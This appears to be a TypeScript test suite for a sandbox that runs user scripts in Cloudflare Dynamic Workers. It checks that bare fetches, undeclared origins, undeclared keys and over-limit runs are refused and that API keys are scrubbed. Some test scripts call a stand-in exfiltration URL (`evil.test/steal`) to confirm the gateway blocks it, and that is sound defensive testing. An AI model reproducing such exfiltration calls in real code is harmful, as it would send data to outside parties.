/**
 * A person's script, run the way the Cloud runs it: in a Dynamic Worker from `env.LOADER`, with every `fetch` it makes
 * going through `ScriptOutbound` and back into the record's own object (`src/script.ts`).
 *
 * REAL, NOT A STUB LOADER. The research brief allowed a stub if local support was missing, and it is not missing.
 * Measured on September 22nd with the miniflare 5.20260903.0-alpha and workerd 1.20260903.1 that wrangler 4.129.0
 * already brings: a `workerLoaders` binding loads a module from a string, `this.ctx.exports.<Entrypoint>({ props })`
 * works from inside a Durable Object's `alarm()`, and a `WorkerEntrypoint` handed in as `globalOutbound` sees every
 * `fetch` the loaded code makes. So this file runs `src/script.ts` as it ships, bundled by esbuild, in workerd, from
 * an alarm, which is where the record runs it.
 *
 * WHAT IT CANNOT SAY, AND THE DEPLOY SMOKE HAS TO. Local workerd enforces no subrequest ceiling: the probe above made
 * ten fetches under `limits: { subRequests: 5 }` and all ten went through. Whether Cloudflare counts a script's
 * fetches against the alarm's invocation, or against the RPC call each one arrives as, is a question only a deployed
 * record answers.
 *
 * THE OBJECT BELOW STANDS IN FOR `Record$` AND DOES THE ONE THING `Record$` DOES WITH A RUN: it hands `runScript` its
 * loader, its exports, its own id and a `ScriptRuns`, and answers the gateway's calls with that `ScriptRuns`. The send
 * underneath is the real `sendAction` over a `send` double, so nothing leaves the machine and the key's scrubbing is
 * the shipped one.
 *
 * SLOW BY THE STANDARDS OF THIS SUITE, a few seconds, nearly all of it workerd starting once.
 */

import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { fileURLToPath, pathToFileURL } from 'node:url';

const here = fileURLToPath(new URL('.', import.meta.url));
const fromWrangler = createRequire(createRequire(import.meta.url).resolve('wrangler/package.json'));
const esbuild = fromWrangler('esbuild') as {
  build(o: object): Promise<{ outputFiles: { text: string }[] }>;
};
const { Miniflare, convertV4MiniflareOptions } = (await import(pathToFileURL(fromWrangler.resolve('miniflare')).href)) as {
  Miniflare: new (o: object) => { dispatchFetch(url: string, init?: object): Promise<Response>; dispose(): Promise<void> };
  convertV4MiniflareOptions(o: object): object;
};

const KEY = 'sk_live_gold_5f3a9c';
const GOLD = 'https://api.gold.test';

/**
 * The record's side of a run, in an alarm. `fetch` stores what to run, sets the alarm, and waits for the alarm to
 * write its answer, so the run happens inside `alarm()` and not inside the request that asked for it.
 */
const ENTRY = `
import { DurableObject } from 'cloudflare:workers';
import { sendAction } from '@braindog/host/actions';
import { ScriptOutbound, ScriptRecord, ScriptRuns, runScript } from '../src/script.ts';

export { ScriptOutbound, ScriptRecord };

export class Rec extends DurableObject {
  runs = new ScriptRuns();

  async script(run, call) {
    return this.runs.answer(run, call);
  }

  async fetch(request) {
    const asked = await request.json();
    await this.ctx.storage.delete('out');
    await this.ctx.storage.put('asked', asked);
    await this.ctx.storage.setAlarm(Date.now());
    for (let i = 0; i < 400; i++) {
      await new Promise((r) => setTimeout(r, 25));
      const out = await this.ctx.storage.get('out');
      if (out) return Response.json(out);
    }
    return Response.json({ never: true });
  }

  async alarm() {
    const scripted = await this.ctx.storage.get('asked');
    const sent = [];
    const methods = [];
    const send = sendAction({
      origins: () => scripted.scripted.decl.egress,
      openKey: async (grant) => (grant.label === 'goldapi' ? '${KEY}' : null),
      send: async (url, init) => {
        sent.push(url.href);
        methods.push(init.method);
        if (url.pathname === '/slow') await new Promise((r) => setTimeout(r, 2000));
        return Response.json({ price: 4321, heard: init.headers.get('authorization') });
      },
    });
    let answer;
    try {
      answer = await runScript(
        {
          loader: this.env.LOADER,
          exports: this.ctx.exports,
          object: this.ctx.id.toString(),
          runs: this.runs,
          send: () => send,
          grant: (label) => (label === 'goldapi' ? { id: 'grt_gold', label } : null),
          read: {
            list: async (register) => [{ register, value: 1 }],
            get: async (spoken) => ({ spoken }),
          },
          now: () => Date.UTC(2026, 8, 22, 12),
        },
        scripted,
      );
    } catch (e) {
      answer = { threw: String(e && e.message ? e.message : e) };
    }
    await this.ctx.storage.put('out', { answer, sent, methods, open: this.runs.size });
  }
}

export default {
  fetch(request, env) {
    return env.RECORD.get(env.RECORD.idFromName('one')).fetch(request);
  },
};
`;

type Answer = {
  writes?: { op: string; register?: string; fields?: Record<string, unknown> }[];
  refused?: { code: string | null; why: string };
  log?: string;
  usage?: { fetches: number; bytes: number; wall_ms: number; cpu_ms: number };
  threw?: string;
};
type Out = { answer: Answer; sent: string[]; methods: string[]; open: number; never?: true };

let mf: InstanceType<typeof Miniflare>;

before(async () => {
  const built = await esbuild.build({
    stdin: { contents: ENTRY, resolveDir: here, sourcefile: 'script.entry.js', loader: 'js' },
    bundle: true,
    write: false,
    format: 'esm',
    platform: 'neutral',
    conditions: ['workerd', 'worker', 'browser'],
    mainFields: ['module', 'main'],
    external: ['cloudflare:workers'],
    logLevel: 'silent',
  });
  mf = new Miniflare(
    convertV4MiniflareOptions({
      port: 0,
      modules: true,
      script: built.outputFiles[0]!.text,
      /* `wrangler.jsonc`'s own date and flags, because a different date is a different runtime. */
      compatibilityDate: '2026-09-01',
      compatibilityFlags: [],
      durableObjects: { RECORD: { className: 'Rec', useSQLite: true } },
      workerLoaders: { LOADER: {} },
    }),
  );
});

after(async () => {
  await mf?.dispose();
});

/**
 * One version per distinct source, as the kernel keeps it: a new source is a new declaration row and a new version.
 *
 * FOUND BY THIS FILE'S FIRST RUN. Every case here used `gold-rate` v1, and eight of eleven failed with the first case's
 * answer, because `LOADER.get` served the Worker it had cached under `<record>:gold-rate:v1` whatever source was
 * handed the second time. That is the cache doing what it is for, and it means the id must change whenever the source
 * does, which in the record it always does.
 */
const versions = new Map<string, number>();
const versionOf = (source: string): number => {
  if (!versions.has(source)) versions.set(source, versions.size + 1);
  return versions.get(source)!;
};

/** A leased `script.run`, as `prepareScript` hands it to a host. */
const scripted = (source: string, over: Record<string, unknown> = {}) => ({
  job: { id: 'job_gold_1', kind: 'script.run', payload: '{}', leasedUntil: null },
  host: 'api.gold.test',
  scripted: {
    script: 'gold-rate',
    version: versionOf(source + JSON.stringify(over)),
    actor: `script:gold-rate@v${versionOf(source + JSON.stringify(over))}`,
    input: null,
    decl: { egress: [GOLD], keys: ['goldapi'], reads: [], writes: ['series.gold'], limits: { wall_ms: 5_000 }, source, ...over },
    record: { id: 'rec_01JZ8QK3F7R2M9V4XN6TCB5HAD', tz: 'Africa/Cairo' },
  },
});

const run = async (source: string, over: Record<string, unknown> = {}): Promise<Out> => {
  const res = await mf.dispatchFetch('http://record/', { method: 'POST', body: JSON.stringify(scripted(source, over)) });
  const out = (await res.json()) as Out;
  assert.notEqual(out.never, true, 'the alarm never wrote an answer');
  return out;
};

/** The shared fixture: a bare fetch twice, then the one way out, `ctx.fetch` with a key by label. */
const GOLD_RATE = `
export default async function run(ctx) {
  for (const url of ['https://example.com/', '${GOLD}/rate']) {
    try {
      await fetch(url);
      ctx.log('bare went to ' + url);
    } catch (e) {
      ctx.log('bare refused ' + url);
    }
  }
  const r = await ctx.fetch('${GOLD}/rate', { key: 'goldapi' });
  const { price, heard } = await r.json();
  ctx.write('series.gold', { at: ctx.now(), value: price, heard });
}`;

test('a bare fetch is refused at the gateway and ctx.fetch to the declared origin goes through sendAction with the key', async () => {
  const { answer, sent, open } = await run(GOLD_RATE);
  assert.equal(answer.threw, undefined, answer.threw);
  assert.equal(answer.refused, undefined, JSON.stringify(answer.refused));
  /* BOTH BARE FETCHES STOPPED, INCLUDING THE ONE TO THE DECLARED ORIGIN. What lets a request out is the run it
     belongs to, not the address it names, so a bare `fetch` is refused wherever it points. */
  assert.match(answer.log ?? '', /bare refused https:\/\/example\.com\//);
  assert.match(answer.log ?? '', /bare refused https:\/\/api\.gold\.test\/rate/);
  assert.doesNotMatch(answer.log ?? '', /bare went/);
  assert.deepEqual(sent, [`${GOLD}/rate`], 'only ctx.fetch reached the send');
  assert.deepEqual(answer.writes, [
    { op: 'create', register: 'series.gold', fields: { at: '2026-09-22T12:00:00.000Z', value: 4321, heard: 'Bearer --redacted--' } },
  ]);
  assert.equal(answer.usage?.fetches, 1);
  assert.equal(open, 0, 'the run was closed when it answered');
});

test('the key never reaches the sandbox: sendAction scrubbed it from the answer before the script read it', async () => {
  const { answer } = await run(GOLD_RATE);
  assert.doesNotMatch(JSON.stringify(answer), new RegExp(KEY));
});

test('a second run of the same version reuses the cached Worker and still gets its own run', async () => {
  const first = await run(GOLD_RATE);
  const second = await run(GOLD_RATE);
  assert.equal(first.answer.writes?.length, 1);
  assert.equal(second.answer.writes?.length, 1);
  assert.equal(second.answer.usage?.fetches, 1, 'the second run counted its own fetch, not the first run\'s as well');
});

test('ctx.fetch to an origin outside egress refuses the whole run even when the script catches it', async () => {
  const { answer, sent } = await run(`
export default async function run(ctx) {
  try { await ctx.fetch('https://evil.test/steal'); } catch (e) { ctx.log('caught'); }
  ctx.write('series.gold', { value: 1 });
}`);
  assert.equal(answer.refused?.code, 'PULL_ORIGIN_REFUSED');
  assert.equal(answer.writes, undefined);
  assert.deepEqual(sent, []);
});

/**
 * AND NOTHING AFTER THE BROKEN RULE IS SENT, NOT ONLY NOTHING WRITTEN. The case above made no fetch after the one it
 * caught, so deleting the sticky check in `ScriptRuns.answer` left every case here green while a caught refusal was
 * followed by a request to the declared origin going out. The checker measured that; this case is red against it.
 */
test('a fetch after a caught refusal is refused too, and never reaches the send', async () => {
  const { answer, sent } = await run(`
export default async function run(ctx) {
  try { await ctx.fetch('https://evil.test/steal'); } catch (e) {}
  try { await ctx.fetch('${GOLD}/rate', { key: 'goldapi' }); } catch (e) { ctx.log('second refused'); }
}`);
  assert.equal(answer.refused?.code, 'PULL_ORIGIN_REFUSED');
  assert.deepEqual(sent, []);
});

test('a key the script does not declare is FORBIDDEN and nothing is sent', async () => {
  const { answer, sent } = await run(`
export default async function run(ctx) {
  try { await ctx.fetch('${GOLD}/rate', { key: 'bank' }); } catch (e) {}
}`);
  assert.equal(answer.refused?.code, 'FORBIDDEN');
  assert.deepEqual(sent, []);
});

test('fetches past limits.fetches refuse the run as OUT_OF_BOUNDS', async () => {
  const { answer, sent } = await run(
    `
export default async function run(ctx) {
  for (let i = 0; i < 4; i++) { try { await ctx.fetch('${GOLD}/n' + i); } catch (e) {} }
}`,
    { limits: { wall_ms: 5_000, fetches: 2 } },
  );
  assert.equal(answer.refused?.code, 'OUT_OF_BOUNDS');
  assert.equal(sent.length, 2);
});

/**
 * THE METHOD THE SCRIPT WROTE IS THE METHOD SENT, AS ON THE SELF-HOST. `@braindog/host/script` passes it through as
 * written, and this host turned everything that was not a GET into a POST: a `DELETE` of a provider's row went out as a
 * POST to the same URL, which on most APIs is a create. Found by the checker; this case was red against that mapping.
 */
test('ctx.fetch sends the method the script asked for, not a POST in its place', async () => {
  const { answer, methods } = await run(`
export default async function run(ctx) {
  for (const method of ['DELETE', 'put', 'PATCH', 'POST', 'GET']) await ctx.fetch('${GOLD}/rows/1', { method, body: method === 'GET' ? undefined : '{}' });
}`);
  assert.equal(answer.refused, undefined, JSON.stringify(answer.refused));
  assert.deepEqual(methods, ['DELETE', 'PUT', 'PATCH', 'POST', 'GET']);
});

test('a write the Worker was handed for a register outside writes is refused on this side of the boundary', async () => {
  const { answer } = await run(`
export default async function run(ctx) {
  ctx.write('money.ledger', { value: 1 });
}`);
  assert.equal(answer.refused?.code, 'FORBIDDEN');
  assert.equal(answer.writes, undefined);
});

test('a script that throws is refused with code null and keeps its log', async () => {
  const { answer } = await run(`
export default async function run(ctx) {
  ctx.log('before');
  throw new Error('no rate today');
}`);
  assert.equal(answer.refused?.code, null);
  assert.match(answer.refused?.why ?? '', /no rate today/);
  assert.match(answer.log ?? '', /before/);
});

test('a source with no default export is DECLARATION_INVALID', async () => {
  const { answer } = await run('export const x = 1;');
  assert.equal(answer.refused?.code, 'DECLARATION_INVALID');
});

test('a run that outlives wall_ms is refused within it, and the run is closed behind it', async () => {
  const started = Date.now();
  const { answer, open } = await run(
    `
export default async function run(ctx) {
  await ctx.fetch('${GOLD}/slow');
  ctx.write('series.gold', { value: 2 });
}`,
    { limits: { wall_ms: 300 } },
  );
  assert.equal(answer.refused?.code, 'OUT_OF_BOUNDS');
  assert.equal(answer.writes, undefined);
  assert.ok(Date.now() - started < 2_000, 'the answer did not wait for the slow fetch');
  assert.equal(open, 0);
});

test('reads go through ScriptRecord and only for a declared register', async () => {
  const allowed = await run(
    `
export default async function run(ctx) {
  const rows = await ctx.record.list('series.gold');
  ctx.write('series.gold', { seen: rows.length });
}`,
    { reads: ['series.gold'] },
  );
  assert.deepEqual(allowed.answer.writes, [{ op: 'create', register: 'series.gold', fields: { seen: 1 } }]);

  const refused = await run(`
export default async function run(ctx) {
  try { await ctx.record.list('money.ledger'); } catch (e) {}
}`);
  assert.equal(refused.answer.refused?.code, 'FORBIDDEN');
});
